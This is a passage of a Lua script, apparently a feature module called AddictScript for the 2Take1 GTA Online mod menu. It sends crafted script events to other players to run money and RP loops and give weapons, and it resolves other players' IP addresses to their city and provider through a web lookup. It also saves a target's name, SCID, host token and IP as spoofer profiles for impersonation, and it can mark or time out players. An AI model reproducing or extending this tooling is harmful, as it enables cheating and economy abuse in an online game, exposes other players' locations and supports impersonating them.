		script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 17, i, 1, 1, 1})
	end
end)

playerfeature["Give All Weapons"] = menu.add_player_feature("Give All Weapons", "action", playerparents["Friendly"].id, function(f, pid)
	for i = 1, #DataMain.all_weapon_hashes do
		weapon.give_delayed_weapon_to_ped(player.get_player_ped(pid), DataMain.all_weapon_hashes[i], 0, false)
		weapon.set_ped_ammo(player.get_player_ped(pid), DataMain.all_weapon_hashes[i], select(2, weapon.get_max_ammo(player.get_player_ped(pid), DataMain.all_weapon_hashes[i])))
	end
end)

playerfeature["Unstuck"] = menu.add_player_feature("Unstuck", "action", playerparents["Friendly"].id, function(f, pid)
	if player.is_player_valid(pid) then
		script.trigger_script_event(0xF5F36157, pid, {player.player_id(), pid, 1, 0, math.random(1, 114), 1, 1, 1})
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end)

playerfeature["Never Wanted"] = menu.add_player_feature("Never Wanted", "toggle", playerparents["Friendly"].id, function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
			script.trigger_script_event(1071490035, pid, {player.player_id(), 0, 0, utils.time_ms(), 0, script_func.get_global_main(pid)})
			system.wait(5000)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

playerfeature["Off The Radar"] = menu.add_player_feature("Off The Radar", "toggle", playerparents["Friendly"].id, function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
			script.trigger_script_event(-162943635, pid, {player.player_id(), utils.time() - 60, utils.time(), 1, 1, script_func.get_global_main(pid)})
			system.wait(5000)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

playerfeature["Ceo Money Loop"] = menu.add_player_feature("Ceo Money Loop", "value_str", playerparents["Friendly"].id, function(f, pid)
	if f.on then
		if f.value == 0 then
			script.trigger_script_event(245065909, pid, {pid, 10000, -1292453789, 0, script_func.get_global_main(pid), script_func.get_global_9(), script_func.get_global_10()})
			system.wait(120100)
		elseif f.value == 1 then
			script.trigger_script_event(245065909, pid, {pid, 10000, -1292453789, 1, script_func.get_global_main(pid), script_func.get_global_9(), script_func.get_global_10()})
			system.wait(60100)
		elseif f.value == 2 then
			script.trigger_script_event(245065909, pid, {pid, 30000, 198210293, 1, script_func.get_global_main(pid), script_func.get_global_9(), script_func.get_global_10()})
			system.wait(120100)
		end
	end
	return HANDLER_CONTINUE
end):set_str_data({
	"10K (Every 2 Min)",
	"10K (Every 60 Sec)",
	"30K (Every 2 Min)"
})

playerfeature["RP Drop"] = menu.add_player_feature("RP Drop", "toggle", playerparents["Give Collectibles"].id, function(f, pid)
	while f.on do
		local random_hash = 0x4D6514A3
		local random_int = math.random(1, 8)
		if random_int == 1 then
			random_hash = 0x4D6514A3
		elseif random_int == 2 then
			random_hash = 0x748F3A2A
		elseif random_int == 3 then
			random_hash = 0x1A9736DA
		elseif random_int == 4 then
			random_hash = 0x3D1B7A2F
		elseif random_int == 5 then
			random_hash = 0x1A126315
		elseif random_int == 6 then
			random_hash = 0xD937A5E9
		elseif random_int == 7 then
			random_hash = 0x23DDE6DB
		elseif random_int == 8 then
			random_hash = 0x991F8C36
		end
		utilities.request_model(random_hash)
		natives.CREATE_AMBIENT_PICKUP(0x2C014CA6, player.get_player_coords(pid) + v3(0, 0, 3), 0, 1, random_hash, false, true)
		system.yield(50)
	end
end)

playerfeature["Drop Cards"] = menu.add_player_feature("Drop Cards", "toggle", playerparents["Give Collectibles"].id, function(f, pid)
	if f.on then
		menu.create_thread(function()
				utilities.request_model(0xB4A24065)
				natives.CREATE_AMBIENT_PICKUP(0x2C014CA6, player.get_player_coords(pid).x, player.get_player_coords(pid).y, player.get_player_coords(pid).z, 0, -1, 0xB4A24065, false, true)
				streaming.set_model_as_no_longer_needed(0xB4A24065)
		end, nil)
	end
	return HANDLER_CONTINUE
end)

playerfeature["{Jrukii's}RP Loop"] = menu.add_player_feature("{Jrukii's}RP Loop", "toggle", playerparents["Friendly"].id, function(f, pid) --Credit to Jrukii for making this
if f.on then
for i = 1, 20 do
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 4, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 8, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 9, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 1, i, i, i})
	script.trigger_script_event(ScriptEvent["Give Collectibles"], pid, {1, 8, i, 1, 1, 1})
	system.yield(20)
		end
	end
	return HANDLER_CONTINUE
end)

playerfeature["Money Loop"] = menu.add_player_feature("Money Loop", "toggle", playerparents["Friendly"].id, function(f, pid) --Credit to Jrukii for making this
if f.on then
if script.get_host_of_this_script() == pid then
	script.trigger_script_event(1279059857, pid, {pid, 288807, 140707433584256})
	script.trigger_script_event(1279059857, pid, {pid, 288808, 140707735690094})
	script.trigger_script_event(1279059857, pid, {pid, 288809, 140707423584256})
	script.trigger_script_event(1279059857, pid, {pid, 288810, 140707423584256})
	script.trigger_script_event(1279059857, pid, {pid, 288811, 140707423584257})
	script.trigger_script_event(1279059857, pid, {pid, 288812, 140709571067903})
	script.trigger_script_event(1279059857, pid, {pid, 288806, 140707423584256})
	script.trigger_script_event(1279059857, pid, {pid, 26003, 140707423584257})
	system.yield(200)
    script.trigger_script_event(1279059857, pid, {pid, 288807, 140728908420736})
	script.trigger_script_event(1279059857, pid, {pid, 288808, 140729210526574})
	script.trigger_script_event(1279059857, pid, {pid, 288809, 140728898420736})
	script.trigger_script_event(1279059857, pid, {pid, 288810, 140728898420736})
	script.trigger_script_event(1279059857, pid, {pid, 288811, 140728898420737})
	script.trigger_script_event(1279059857, pid, {pid, 288812, 140731045904383})
	script.trigger_script_event(1279059857, pid, {pid, 288806, 140728898420736})
	script.trigger_script_event(1279059857, pid, {pid, 26003, 140728898420737})
	system.yield(200)
	else
	f.on = false
    	menu.notify("The player must be script host.", AddictScript, 3, 211)
		return
		  end
		end
	return HANDLER_CONTINUE
end)

playerparents["Spawn"] = menu.add_player_feature("Spawn", "parent", playerparents["AddictScript"].id)

playerparents["Player Info"] = menu.add_player_feature("Player Info", "parent", playerparents["AddictScript"].id, function(f, pid)
	playerfeature["Player Info Name"]:set_str_data({tostring(player.get_player_name(pid))})
	playerfeature["Player Info SCID"]:set_str_data({tostring(player.get_player_scid(pid))})
	playerfeature["Player Info IP"]:set_str_data({tostring(utilities.dec_to_ipv4(player.get_player_ip(pid)))})
	playerfeature["Player Info Host Token"]:set_str_data({tostring(string.format("%x", player.get_player_host_token(pid)))})
	playerfeature["Player Info Rank"]:set_str_data({tostring(script_func.get_player_rank(pid))})
	playerfeature["Player Info Money Amount"]:set_str_data({tostring(script_func.get_player_money(pid))})
	playerfeature["Player Info Prostitutes Solicited"]:set_str_data({tostring(script_func.get_prostitutes_solicited(pid))})
	playerfeature["Player Info Lapdances"]:set_str_data({tostring(script_func.get_lapdances_amount(pid))})
	playerfeature["Player Info Kills"]:set_str_data({tostring(script_func.get_player_kills(pid))})
	playerfeature["Player Info Deaths"]:set_str_data({tostring(script_func.get_player_deaths(pid))})
	playerfeature["Player Info Missions Created"]:set_str_data({tostring(script_func.get_player_missions_created(pid))})
	--playerfeature["Player Info test"]:set_str_data({tostring(script_func.get_player_test(pid))})
end)

playerfeature["Player Info Name"] = menu.add_player_feature("Name", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Name"]:set_str_data({""})

playerfeature["Player Info SCID"] = menu.add_player_feature("SCID", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info SCID"]:set_str_data({""})

playerfeature["Player Info IP"] = menu.add_player_feature("IP", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info IP"]:set_str_data({""})

playerfeature["Player Info Host Token"] = menu.add_player_feature("Host Token", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Host Token"]:set_str_data({""})

playerfeature["Player Info Rank"] = menu.add_player_feature("Rank", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Rank"]:set_str_data({""})

playerfeature["Player Info Money Amount"] = menu.add_player_feature("Money Amount", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Money Amount"]:set_str_data({""})

playerfeature["Player Info Prostitutes Solicited"] = menu.add_player_feature("Prostitutes Solicited", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Prostitutes Solicited"]:set_str_data({""})

playerfeature["Player Info Lapdances"] = menu.add_player_feature("Lapdances", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Lapdances"]:set_str_data({""})

playerfeature["Player Info Kills"] = menu.add_player_feature("Kills", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Kills"]:set_str_data({""})

playerfeature["Player Info Deaths"] = menu.add_player_feature("Deaths", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Deaths"]:set_str_data({""})

playerfeature["Player Info Favorite Station"] = menu.add_player_feature("Favorite Station", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Favorite Station"]:set_str_data({""})

playerfeature["Player Info Missions Created"] = menu.add_player_feature("Missions Created", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info Missions Created"]:set_str_data({""})
--[[
playerfeature["Player Info test"] = menu.add_player_feature("test", "action_value_str", playerparents["Player Info"].id, function(f, pid)
	utils.to_clipboard(f.str_data[1])
end)
playerfeature["Player Info test"]:set_str_data({""})
]]
playerparents["Modder Options"] = menu.add_player_feature("Modder Options", "parent", playerparents["AddictScript"].id)

playerfeature["Mark"] = menu.add_player_feature("Mark", "action_value_str", playerparents["Modder Options"].id, function(f, pid)
	if f.value == 0 then
		player.set_player_as_modder(pid, -1)
		for k, v in pairs(Detections) do
			v[pid] = true
		end
	else
		player.set_player_as_modder(pid, 1 << f.value - 1)
	end
end)
playerfeature["Mark"]:set_str_data(DataMain.all_modder_flags_table)

playerfeature["Unmark"] = menu.add_player_feature("Unmark", "action_value_str", playerparents["Modder Options"].id, function(f, pid)
	if f.value == 0 then
		player.unset_player_as_modder(pid, -1)
		for k, v in pairs(Detections) do
			v[pid] = nil
		end
	else
		player.unset_player_as_modder(pid, 1 << f.value - 1)
	end
end)
playerfeature["Unmark"]:set_str_data(DataMain.all_modder_flags_table)

playerfeature["Notify"] = menu.add_player_feature("Notify", "action_value_str", playerparents["Modder Options"].id, function(f, pid)
	if f.value == 0 then
		for i = 1, #DataMain.all_modder_flags_table do
			menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: " .. DataMain.all_modder_flags_table[i], "Modder Detection", 12, 0x00A2FF)
		end
	else
		menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: " .. player.get_modder_flag_text(1 << f.value - 1), "Modder Detection", 12, 0x00A2FF)
	end
end)
playerfeature["Notify"]:set_str_data(DataMain.all_modder_flags_table)

playerfeature["Whitelist"] = menu.add_player_feature("Whitelist", "toggle", playerparents["Modder Options"].id, function(f, pid)
	local Whitelist = menu.get_feature_by_hierarchy_key("online.online_players.player_" .. pid .. ".modder_detection.whitelist")
	Whitelist.on = f.on
	while f.on do
		if not Whitelist.on then
			f.on = false
		end
		system.yield(0)
	end
end)

playerfeature["Timeout"] = menu.add_player_feature("Timeout", "action_value_i", playerparents["Modder Options"].id, function(f, pid)
	if not AddictScriptIsPlayerTimeout[pid] and f.value > 0 then
		player_func.timeout_player(pid, f.value * 1000)
	end
end)
playerfeature["Timeout"].max = 60
playerfeature["Timeout"].min = 0
playerfeature["Timeout"].mod = 10
playerfeature["Timeout"].value = 0

playerfeature["IP Info"] = menu.add_player_feature("IP Info", "action", playerparents["AddictScript"].id, function(f, pid)
	if player.is_player_valid(pid) then
		local success, webdata = web.get("https://proxycheck.io/v2/" .. utilities.dec_to_ipv4(player.get_player_ip(pid)) .. "?vpn=1&asn=1")
		if string.find(webdata, "ok") then
			local ip_real = utilities.dec_to_ipv4(player.get_player_ip(pid))
			local provider_real = webdata:match("\"provider\":%s*\"([^\"]+)\",")
			local continent_real = webdata:match("\"continent\":%s*\"([^\"]+)\",")
			local country_real = webdata:match("\"country\":%s*\"([^\"]+)\",")
			local region_real = webdata:match("\"region\":%s*\"([^\"]+)\",")
			local city_real = webdata:match("\"city\":%s*\"([^\"]+)\",")
			local proxy_real = webdata:match("\"proxy\":%s*\"([^\"]+)\",")
			local type_real = webdata:match("\"type\":%s*\"([^\"]+)\"")
			local ping_real = text_func.round_three_dc(natives.NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER(pid):__tonumber())
			menu.notify("IP: " .. tostring(ip_real) .. "\nProvider: " .. tostring(provider_real) .. "\nContinent: " .. tostring(continent_real) .. "\nCountry: " .. tostring(country_real) .. "\nRegion: " .. tostring(region_real) .. "\nCity: " .. tostring(city_real) .. "\nProxy: " .. tostring(proxy_real) .. "\nType: " .. tostring(type_real) .. "\nPing: " .. tostring(ping_real) .. "", "Player IP Info", 24, NotifyColours["green"])
		elseif string.find(webdata, "error") then
			menu.notify("Invalid IP Address!\n" .. utilities.dec_to_ipv4(player.get_player_ip(pid)), "Player IP Info", 12, NotifyColours["green"])
		elseif string.find(webdata, "denied") then
			menu.notify("Nooo you reached the max api requests for today :(((((((((((((", AddictScript, 4, NotifyColours["red"])
		end
	end
end)

playerfeature["Add To Blacklist"] = menu.add_player_feature("Add To Blacklist", "action", playerparents["AddictScript"].id, function(f, pid)
	if player.is_player_valid(pid) then
		if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt")) then
			if not string.find(player.get_player_name(pid), "|") then
				text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "Blacklist.txt"), "a"), text_func.generate_random_id() .. "|" .. tostring(player.get_player_name(pid)) .. "|" .. tostring(player.get_player_scid(pid)) .. "|" .. tostring(player.get_player_ip(pid)) .. "\n")
				menu.notify("Successfully added player to blacklist!", AddictScript, 3, NotifyColours["green"])
			end
		end
	end
end)

playerfeature["Add To Spoofer Profiles"] = menu.add_player_feature("Add To Spoofer Profiles", "action", playerparents["AddictScript"].id, function(f, pid)
	if player.is_player_valid(pid) then
		local random_id = math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9) .. math.random(0, 9)
		if utils.file_exists(utils.get_appdata_path(Paths.Menu.spoofer, random_id .. ".ini")) then
			menu.notify("Failed to add player to spoofer profiles, please try again.", AddictScript, 3, NotifyColours["red"])
		else
			local rockstardev = 0
			if natives.NETWORK_PLAYER_IS_ROCKSTAR_DEV(pid) then
				rockstardev = 1
			end
			text_func.write(io.open(utils.get_appdata_path(Paths.Menu.spoofer, random_id .. ".ini"), "w"), "[Profile]\nname=" .. tostring(player.get_player_name(pid)) .. "\nscid=" .. player.get_player_scid(pid) .. "\nhost_token=" .. player.get_player_host_token(pid) .. "\nlevel=" .. script_func.get_player_rank(pid) .. "\nmoney_wallet=" .. script_func.get_player_wallet(pid) .. "\ndev=" .. rockstardev .. "\nip=" .. player.get_player_ip(pid) .. "\nmoney_total=" .. script_func.get_player_money(pid) .. "\nkd=" .. script_func.get_player_kd(pid) .. "")
		end
		system.yield(100)
		if utils.file_exists(utils.get_appdata_path(Paths.Menu.spoofer, random_id .. ".ini")) then
			menu.notify("Successfully added player to spoofer profiles!", AddictScript, 3, NotifyColours["green"])
		else
			menu.notify("Failed to add player to spoofer profiles, please try again.", AddictScript, 3, NotifyColours["red"])
		end
	end
end)

do
	local load_selected_setting = utils.get_all_files_in_directory(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Load"), "ini")
	if #load_selected_setting > 0 then
		if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, load_selected_setting[1])) then
			local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, load_selected_setting[1]), "r")
			for line in file:lines() do
				if string.find(line, "|") then
					local parts = text_func.split_string(line, "|")
					if feature["" .. parts[1] .. ""] then
						if tostring(parts[2]) ~= "nil" then
							if tostring(parts[2]) == "true" then
								feature["" .. parts[1] .. ""].on = true
							else
								feature["" .. parts[1] .. ""].on = false
							end
						end
						if tostring(parts[3]) ~= "nil" then
							local Value = false
							for i = 1, #DataMain.value_feats do
								if feature["" .. parts[1] .. ""].type == DataMain.value_feats[i] then
									Value = true
								end
							end
							if Value then
								feature["" .. parts[1] .. ""].value = tonumber(parts[3])
							end
						end
					end
				end
			end
		elseif utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini")) then
			local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "r")
			for line in file:lines() do
				if string.find(line, "|") then
					local parts = text_func.split_string(line, "|")
					if feature["" .. parts[1] .. ""] then
						if tostring(parts[2]) ~= "nil" then
							if tostring(parts[2]) == "true" then
								feature["" .. parts[1] .. ""].on = true
							else
								feature["" .. parts[1] .. ""].on = false
							end
						end
						if tostring(parts[3]) ~= "nil" then
							local Value = false
							for i = 1, #DataMain.value_feats do
								if feature["" .. parts[1] .. ""].type == DataMain.value_feats[i] then
									Value = true
								end
							end
							if Value then
								feature["" .. parts[1] .. ""].value = tonumber(parts[3])
							end
						end
					end
				end
			end
		else
			text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "w"), "")
		end
	else
		text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles .. "\\Load", "Default.ini"), "w"), "")
		if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini")) then
			local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "r")
			for line in file:lines() do
				if string.find(line, "|") then
					local parts = text_func.split_string(line, "|")
					if feature["" .. parts[1] .. ""] then
						if tostring(parts[2]) ~= "nil" then
							if tostring(parts[2]) == "true" then
								feature["" .. parts[1] .. ""].on = true
							else
								feature["" .. parts[1] .. ""].on = false
							end
						end
						if tostring(parts[3]) ~= "nil" then
							local Value = false
							for i = 1, #DataMain.value_feats do
								if feature["" .. parts[1] .. ""].type == DataMain.value_feats[i] then
									Value = true
								end
							end
							if Value then
								feature["" .. parts[1] .. ""].value = tonumber(parts[3])
							end
						end
					end
				end
			end
		else
			text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Profiles, "Default.ini"), "w"), "")
		end
	end
end

do
	if feature["Use Scripts As Modules"] then
		if feature["Use Scripts As Modules"].on then
			local original_function <const> = menu.add_feature
			menu.add_feature = function(stringname, stringtype, integerparent, functionscript_handler)
				local mainparent = integerparent
				if integerparent == 0 then
					mainparent = localparents["Modules"].id
				end
				return original_function(stringname, stringtype, mainparent, functionscript_handler)
			end
		end
	end
end

threads["Menu Unload"] = menu.create_thread(function()
	listeners["Menu Unload"] = event.add_event_listener("exit", function()
		if SaveCurrentPosition then
			if player.is_player_in_any_vehicle(player.player_id()) then
				entity.set_entity_coords_no_offset(player.get_player_vehicle(player.player_id()), SaveCurrentPosition)
			else
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), SaveCurrentPosition)
			end
			SaveCurrentPosition = nil
		end
		if freecam_player_cam then
			natives.DESTROY_CAM(freecam_player_cam, false)
			natives.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
			freecam_player_cam = nil
		end
		for i = 1, #DataMain.all_weapon_hashes do
			natives.SET_WEAPON_EXPLOSION_RADIUS_MULTIPLIER(DataMain.all_weapon_hashes[i], 1.0)
		end
		natives.UNLOCK_MINIMAP_POSITION()
		natives.ENABLE_ALL_CONTROL_ACTIONS(0)
		natives.CLEAR_FOCUS()
		if IsRemoteControllingVehicle then
			natives.SET_CAM_ACTIVE(RemoteControlCam, false)
			natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
			natives.DESTROY_CAM(RemoteControlCam, false)
		end
		water.reset_waves_intensity()
		for k, v in pairs(meteor_entities) do
			if meteor_entities[k] then
				network.request_control_of_entity(meteor_entities[k])
				entity.delete_entity(meteor_entities[k])
				meteor_entities[k] = nil
			end
		end
		for i = 0, 100 do
			if listeners["Modder Reaction " .. i] then
				event.remove_event_listener("modder", listeners["Modder Reaction " .. i])
				listeners["Modder Reaction " .. i] = nil
			end
			if listeners["Disable Modder Detection " .. i] then
				event.remove_event_listener("modder", listeners["Disable Modder Detection " .. i])
				listeners["Disable Modder Detection " .. i] = nil
			end
			if eventhooks["Net Event Reaction " .. i] then
				hook.remove_net_event_hook(eventhooks["Net Event Reaction " .. i])
				eventhooks["Net Event Reaction " .. i] = nil
			end
		end
		if listeners["Enable Chat Judger"] then
			event.remove_event_listener("chat", listeners["Enable Chat Judger"])
			listeners["Enable Chat Judger"] = nil
		end
		if eventhooks["Bad Net Event Detection"] then
			hook.remove_net_event_hook(eventhooks["Bad Net Event Detection"])
			eventhooks["Bad Net Event Detection"] = nil
		end
		if eventhooks["Explosion Spam Detection"] then
			hook.remove_net_event_hook(eventhooks["Explosion Spam Detection"])
			eventhooks["Explosion Spam Detection"] = nil
		end
		if eventhooks["Net Event Spam Detection"] then
			hook.remove_net_event_hook(eventhooks["Net Event Spam Detection"])
			eventhooks["Net Event Spam Detection"] = nil
		end
		if eventhooks["Request Spam Detection"] then
			hook.remove_net_event_hook(eventhooks["Request Spam Detection"])
			eventhooks["Request Spam Detection"] = nil
		end
		if eventhooks["Script Event Spam Detection"] then
			hook.remove_script_event_hook(eventhooks["Script Event Spam Detection"])
			eventhooks["Script Event Spam Detection"] = nil
		end
		if eventhooks["Bad Net Script Detection"] then
			hook.remove_script_event_hook(eventhooks["Bad Net Script Detection"])
			eventhooks["Bad Net Script Detection"] = nil
		end
		if listeners["Main Player Leave"] then
			event.remove_event_listener("player_leave", listeners["Main Player Leave"])
			listeners["Main Player Leave"] = nil
		end
		if listeners["Main Player Join"] then
			event.remove_event_listener("player_join", listeners["Main Player Join"])
			listeners["Main Player Join"] = nil
		end
		if listeners["Joining Players"] then
			event.remove_event_listener("player_join", listeners["Joining Players"])
			listeners["Joining Players"] = nil
		end
		if listeners["Vpn Check"] then
			event.remove_event_listener("player_join", listeners["Vpn Check"])
			listeners["Vpn Check"] = nil
		end
		if listeners["Leaving Players"] then
			event.remove_event_listener("player_leave", listeners["Leaving Players"])
			listeners["Leaving Players"] = nil
		end
		for k, v in pairs(threads) do
			if threads[k] then
				menu.delete_thread(threads[k])
				threads[k] = nil
			end
		end		
		menu.notify("Unloaded Menu! Cleanup Successful!", AddictScript, 5, NotifyColours["green"])
		AddictScript = nil
	end)
end, nil)

do
	threads["Welcome Screen"] = menu.create_thread(function()
		local script_execute_scaleform = graphics.request_scaleform_movie("mp_big_message_freemode")
		local time = utils.time_ms() + 4000
		audio.play_sound_from_coord(-1, "LOSER", player.get_player_coords(player.player_id()), "HUD_AWARDS", false, 0, true)
		while time > utils.time_ms() do
			system.yield(0)
			graphics.begin_scaleform_movie_method(script_execute_scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
			graphics.draw_scaleform_movie_fullscreen(script_execute_scaleform, 255, 255, 255, 255, 0)
			graphics.scaleform_movie_method_add_param_texture_name_string("Welcome")
			graphics.scaleform_movie_method_add_param_texture_name_string(AddictScript)
			graphics.end_scaleform_movie_method(script_execute_scaleform)
		end
		audio.play_sound_from_coord(-1, "CHECKPOINT_AHEAD", player.get_player_coords(player.player_id()), "HUD_MINI_GAME_SOUNDSET", false, 0, true)
		graphics.set_scaleform_movie_as_no_longer_needed(script_execute_scaleform)
	end, nil)
end

menu.notify("Loaded Script Successfully!\n\n" .. AddictScript .. " for 2Take1 " , AddictScript, 6, NotifyColours["green"])